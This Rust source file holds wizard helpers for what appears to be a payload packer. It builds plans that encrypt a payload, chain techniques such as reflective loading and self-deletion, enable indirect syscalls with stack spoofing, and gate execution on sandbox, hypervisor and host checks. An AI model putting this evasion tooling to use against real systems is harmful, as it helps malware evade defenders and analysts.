use super::*;

/// The bouncer requirements a previous run declared, for the wizard's defaults.
#[derive(Default)]
pub(super) struct PreviousChecks<'a> {
    pub(super) hostname: Option<&'a str>,
    pub(super) username: Option<&'a str>,
    pub(super) domain: Option<&'a str>,
    pub(super) locale: &'a [String],
    pub(super) keyboard: &'a [String],
    pub(super) ip: &'a [String],
    pub(super) privilege: Option<&'a str>,
    pub(super) elevation: Option<bouncer::Elevation>,
    pub(super) integrity: &'a [bouncer::IntegrityLevel],
    pub(super) uptime_min: Option<u32>,
    pub(super) ram_mb: Option<u32>,
    pub(super) hypervisor: bool,
    pub(super) sandbox: bool,
}

impl<'a> PreviousChecks<'a> {
    /// Scans the previous `require` list for the values the wizard asks about.
    pub(super) fn from_params(previous: Option<&'a bouncer::Params>) -> Self {
        let mut checks = Self::default();
        let Some(params) = previous else {
            return checks;
        };
        checks.hypervisor = params.anti_analysis.hypervisor;
        checks.sandbox = params.anti_analysis.sandbox;
        for requirement in &params.require {
            match requirement {
                bouncer::Requirement::Hostname(value) => checks.hostname = Some(value),
                bouncer::Requirement::Username(value) => checks.username = Some(value),
                bouncer::Requirement::Domain(value) => checks.domain = Some(value),
                bouncer::Requirement::Locale(values) => checks.locale = values,
                bouncer::Requirement::Keyboard(values) => checks.keyboard = values,
                bouncer::Requirement::Ip(values) => checks.ip = values,
                bouncer::Requirement::Privilege(value) => checks.privilege = Some(value),
                bouncer::Requirement::Elevation(value) => checks.elevation = Some(*value),
                bouncer::Requirement::Integrity(values) => checks.integrity = values,
                bouncer::Requirement::UptimeMin(value) => checks.uptime_min = Some(*value),
                bouncer::Requirement::RamMb(value) => checks.ram_mb = Some(*value),
                bouncer::Requirement::Process(_) => {}
                // The wizard does not produce negations; a hand-edited `not`
                // simply contributes no default.
                bouncer::Requirement::Not(_) => {}
            }
        }
        checks
    }

    /// Whether the check with this wizard key was declared previously.
    pub(super) fn is_declared(&self, name: &str) -> bool {
        match name {
            "hostname" => self.hostname.is_some(),
            "username" => self.username.is_some(),
            "domain" => self.domain.is_some(),
            "language" => !self.locale.is_empty(),
            "keyboard" => !self.keyboard.is_empty(),
            "ip" => !self.ip.is_empty(),
            "elevation" => self.elevation.is_some(),
            "integrity" => !self.integrity.is_empty(),
            "privilege" => self.privilege.is_some(),
            "hypervisor" => self.hypervisor,
            "sandbox" => self.sandbox,
            "uptime_min" => self.uptime_min.is_some(),
            "ram_mb" => self.ram_mb.is_some(),
            _ => false,
        }
    }
}

/// The index of a [`TrimPaths`] in the wizard's menu.
pub(super) fn trim_index(trim: TrimPaths) -> usize {
    match trim {
        TrimPaths::All => 0,
        TrimPaths::None => 1,
        TrimPaths::Relative => 2,
    }
}

/// The index of a [`DllEntry`] in the wizard's entry menu.
pub(super) fn dll_entry_index(entry: &DllEntry) -> usize {
    match entry {
        DllEntry::Auto => 0,
        DllEntry::JniOnLoad => 1,
        DllEntry::Export(_) => 2,
    }
}

/// A preparation a `kind: dll` build cannot run: both act on the *running image*
/// (`GetModuleHandleA(NULL)`), which in a DLL build is the host process.
/// `plan::validate` rejects them, so the wizard must not offer them.
pub(super) fn is_dll_incompatible(name: &str) -> bool {
    matches!(name, "self_deletion" | "sleep_obfuscation")
}

/// Whether an execution technique hands the whole process to the payload, so a
/// following step would never run. Mirrors `plan::validate`'s terminal-step rule
/// so the wizard never offers to append a step past it.
pub(super) fn execution_is_terminal(technique: &TechniqueKind, format: PayloadFormat) -> bool {
    match technique {
        TechniqueKind::DotnetHosting { .. } => true,
        // `patch_exit` intercepts the payload's exit, so the step returns control.
        TechniqueKind::ReflectiveLoading { params } => {
            format == PayloadFormat::Pe && !params.patch_exit
        }
        _ => false,
    }
}

/// Whether a technique, by name and payload format, hands the process to the
/// payload (so nothing may follow it).
pub(super) fn def_is_terminal(def: &TechniqueDef, format: PayloadFormat) -> bool {
    match def.name {
        "dotnet_hosting" => true,
        "reflective_loading" => format == PayloadFormat::Pe,
        _ => false,
    }
}

/// Whether `step` is terminal for the detected payload format.
pub(super) fn step_is_terminal(step: &TechniqueKind, format: PayloadFormat) -> bool {
    execution_is_terminal(step, format)
}

/// A chain is well formed when a terminal step, if any, is last.
pub(super) fn chain_ok(steps: &[TechniqueKind], format: PayloadFormat) -> bool {
    steps
        .iter()
        .enumerate()
        .all(|(index, step)| !step_is_terminal(step, format) || index + 1 == steps.len())
}

/// Whether the technique runs under the selected architecture.
pub(super) fn arch_ok(def: &TechniqueDef, arch: &str) -> bool {
    let wanted = if arch == "x86" {
        Capability::WindowsX86
    } else {
        Capability::WindowsX64
    };
    let has_arch = def
        .requires
        .iter()
        .any(|capability| matches!(capability, Capability::WindowsX64 | Capability::WindowsX86));
    !has_arch || def.requires.contains(&wanted)
}

/// The first active step `def` conflicts with, in either direction.
pub(super) fn conflicting_step<'a>(
    def: &TechniqueDef,
    steps: &'a [TechniqueKind],
) -> Option<&'a str> {
    steps.iter().find_map(|step| {
        let other = step.name();
        let conflict = def.conflicts.contains(&other)
            || techniques::find(other)
                .is_some_and(|other_def| other_def.conflicts.contains(&def.name));
        conflict.then_some(other)
    })
}

/// The techniques that can be added to `steps`, and the ones that cannot with a
/// one-line reason.
///
/// This is the runtime editor's model: free ordering, only the limits the
/// packer enforces (single payload format, terminal step, arch, conflicts and
/// `requires_indirect_syscalls`).
pub(super) fn eligible_steps(
    steps: &[TechniqueKind],
    state: &Partial,
) -> (Vec<&'static TechniqueDef>, Vec<String>) {
    let arch = state.arch.as_deref().unwrap_or("x64");
    let kind = state.output_kind.unwrap_or(OutputKind::Exe);
    let syscalls = state.syscalls_mode.as_deref().unwrap_or("none");
    let format = state.payload_format.unwrap_or(PayloadFormat::Pe);
    let has_terminal = steps.iter().any(|step| step_is_terminal(step, format));
    let mut available = Vec::new();
    let mut unavailable = Vec::new();
    for def in techniques::all() {
        let reason = if def.name == "drop" {
            Some("needs a second payload".to_string())
        } else if def.name == "import_powermodule" {
            Some("psmodule-only".to_string())
        } else if kind == OutputKind::Dll && is_dll_incompatible(def.name) {
            Some("mutates the host image in a DLL build".to_string())
        } else if !arch_ok(def, arch) {
            Some("not supported on this architecture".to_string())
        } else if def.requires_indirect_syscalls && syscalls != "indirect" {
            Some("requires indirect syscalls".to_string())
        } else if let Some(other) = conflicting_step(def, steps) {
            Some(format!("conflicts with {other}"))
        } else if def.category == Category::Execution {
            if !def.formats.contains(&format) {
                Some(format!("needs a {} payload", format_label(format)))
            } else if def_is_terminal(def, format) && has_terminal {
                Some("the chain already ends in a terminal step".to_string())
            } else {
                None
            }
        } else {
            None
        };
        match reason {
            Some(reason) => unavailable.push(format!("{} ({reason})", def.name)),
            None => available.push(def),
        }
    }
    (available, unavailable)
}

/// Assembles the [`Plan`] from the answered questions.
///
/// The wizard builds a single-payload plan: the payload's key is the file stem,
/// and the crypto lives on `build.crypto` (no per-payload block).
pub(super) fn assemble(payload: &Path, answers: &Answers) -> Plan {
    let runtime: Vec<RuntimeStep> = answers
        .runtime
        .iter()
        .cloned()
        .map(RuntimeStep::new)
        .collect();
    // The wizard has one payload and sniffs its format from the file; the
    // runtime editor only offers techniques that accept it.
    let format = answers.payload_format;

    let payload_name = default_name(payload);
    let mut payloads = BTreeMap::new();
    payloads.insert(
        payload_name,
        PayloadPlan {
            source: payload.display().to_string(),
            // The format is sniffed from the file (see `detect_payload_format`),
            // so the runtime editor can only offer techniques that accept it.
            format,
            export: None,
            args: (!answers.payload_args.is_empty()).then(|| answers.payload_args.clone()),
            args_mode: ArgsMode::Join,
            // The crypto lives on `build.crypto`; inherited by the payload.
            crypto: None,
            // Integrity pinning is an advanced setting; edit it in the YAML.
            sha256: None,
        },
    );

    let stack_spoofing =
        (answers.syscalls_mode == "indirect" && answers.stack_spoofing).then(|| {
            YamlStackSpoofing {
                decoy_bytes: crate::engine::syscalls::stack_spoofing::default_decoy_bytes(),
            }
        });

    Plan {
        schema: SUPPORTED_SCHEMA,
        name: answers.name.clone(),
        build: BuildPlan {
            crypto: Some(CryptoPlan {
                algo: CryptoAlgorithm::XChaCha20Poly1305,
                key: KeySource::Random,
            }),
            payloads,
            stub: StubPlan {
                // The wizard always renders the builtin stub.
                path: None,
                // Omitted when `none` so the generated YAML stays minimal.
                syscalls: (answers.syscalls_mode == "indirect").then(|| YamlSyscallsPlan {
                    mode: answers.syscalls_mode.clone(),
                    resolver: answers.syscalls_resolver.clone(),
                    stack_spoofing,
                }),
                // API resolution is an advanced loader setting; edit it in the YAML.
                api_resolution: None,
                strings: Some(YamlStringsPlan {
                    strategy: answers.strings_strategy.clone(),
                    // A literal key is an advanced setting; edit it in the YAML.
                    key: "random".to_string(),
                }),
                // Debug builds are a lab setting; edit it in the YAML.
                debug: false,
            },
            // Polymorphism is on by default (`mode: full`); omitted here so the
            // generated YAML stays minimal.
            polymorphism: None,
            output: OutputPlan {
                path: Some(PathBuf::from(&answers.output_path)),
                kind: answers.output_kind,
                entry: answers.dll_entry.clone(),
                console: ConsoleMode::Parent,
                arch: if answers.arch == "x86" {
                    Arch::X86
                } else {
                    Arch::X64
                },
                strip: answers.strip,
                trim_paths: answers.trim_paths,
                manifest: true,
                // PE resources are an advanced setting; edit them in the YAML.
                resources: None,
                // The stub prints markers for the tests, so it stays a console app.
                subsystem: Subsystem::Console,
                sign: None,
            },
        },
        runtime,
        // Reproducibility is a build-time decision (a seed), not a wizard
        // question; a plain build stays random and the manifest records it.
        reproduce: None,
    }
}

/// Human label for the PAYLOAD section and the eligibility reasons.
pub(super) fn format_label(format: PayloadFormat) -> &'static str {
    match format {
        // `detect` always returns a concrete format; the wizard never carries
        // `Auto` past the PAYLOAD section.
        PayloadFormat::Auto => "auto",
        PayloadFormat::Pe => "PE executable",
        PayloadFormat::Dll => "DLL",
        PayloadFormat::Dotnet => ".NET assembly",
        PayloadFormat::Shellcode => "shellcode",
        PayloadFormat::Powershell => "PowerShell script",
        PayloadFormat::Plain => "plain data",
    }
}

/// Builds a step from the technique's documented `params_example`.
///
/// Used for techniques the wizard has no tailored questions for yet: the
/// registry guarantees the snippet parses, so a newly registered technique
/// arrives with its YAML defaults instead of being unreachable.
pub(super) fn default_step(def: &TechniqueDef) -> Result<TechniqueKind> {
    serde_yml::from_str(def.params_example).map_err(|source| {
        PackerError::Validation(format!(
            "technique '{}' has unparsable default params: {source}",
            def.name
        ))
    })
}

/// Derives the default build name from the payload filename.
pub(super) fn default_name(payload: &Path) -> String {
    payload
        .file_stem()
        .and_then(|stem| stem.to_str())
        .unwrap_or("payload")
        .to_string()
}

/// Whether a line answer asks to go back one section (`:b`, `back`, `..`).
pub(super) fn back_requested(input: &str) -> bool {
    matches!(
        input.trim().to_ascii_lowercase().as_str(),
        ":b" | "back" | ".."
    )
}

/// Splits a comma-separated answer, dropping empty items.
pub(super) fn split_list(input: &str) -> Vec<String> {
    input
        .split(',')
        .map(str::trim)
        .filter(|item| !item.is_empty())
        .map(str::to_string)
        .collect()
}

/// Parses a yes/no answer. `None` means "not understood, ask again".
pub(super) fn parse_yes_no(input: &str, default: bool) -> Option<bool> {
    match input.to_ascii_lowercase().as_str() {
        "" => Some(default),
        "y" | "yes" | "true" | "1" => Some(true),
        "n" | "no" | "false" | "0" => Some(false),
        _ => None,
    }
}

/// Parses a menu answer: a 1-based number, an option name, or blank for the
/// default. `None` means "not understood, ask again".
pub(super) fn parse_choice(input: &str, options: &[(&str, &str)], default: usize) -> Option<usize> {
    if input.is_empty() {
        return Some(default);
    }
    if let Ok(number) = input.parse::<usize>() {
        return (1..=options.len()).contains(&number).then(|| number - 1);
    }
    options
        .iter()
        .position(|(name, _)| name.eq_ignore_ascii_case(input))
}

/// Parses a multi-select answer: comma/space/semicolon separated numbers or
/// names. Blank means "none". The result is sorted and de-duplicated so the
/// pipeline order is deterministic regardless of the order typed.
pub(super) fn parse_multi(input: &str, options: &[(&str, &str)]) -> Option<Vec<usize>> {
    if input.is_empty() {
        return Some(Vec::new());
    }
    let mut selected = Vec::new();
    for token in input
        .split([',', ' ', ';'])
        .filter(|token| !token.is_empty())
    {
        selected.push(parse_choice(token, options, 0)?);
    }
    selected.sort_unstable();
    selected.dedup();
    Some(selected)
}

/// Parses a bounded number. `None` means "not understood, ask again".
pub(super) fn parse_number(input: &str, default: u64, min: u64, max: u64) -> Option<u64> {
    if input.is_empty() {
        return Some(default);
    }
    let value: u64 = input.replace('_', "").parse().ok()?;
    (min..=max).contains(&value).then_some(value)
}
